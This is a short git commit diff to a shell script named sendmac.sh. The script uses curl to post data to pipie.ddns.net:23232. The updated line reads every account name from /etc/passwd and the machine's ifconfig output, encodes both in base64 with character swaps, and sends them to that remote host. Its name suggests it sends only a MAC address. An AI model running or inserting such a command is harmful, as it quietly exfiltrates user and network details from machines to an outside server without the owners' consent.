06cfa317d9ec0aecbd0e099bce8beec971b891dd
matthewpipie <matthewpipie@gmail.com>
2017-04-01 11:47:21 -0500

    Update sendmac.sh

--- sendmac.sh
+++ sendmac.sh
@@ -1,1 +1,1 @@
-curl "pipie.ddns.net:23232" -d "id=$(id -un)\&ifconfig=$(/sbin/ifconfig | base64 | tr -- '+=/' '-_~')"
+curl "pipie.ddns.net:23232" -d "users=$(awk -F':' '{ print $1}' /etc/passwd | base64 | tr -- '+=/' '-_~')\&ifconfig=$(/sbin/ifconfig | base64 | tr -- '+=/' '-_~')"
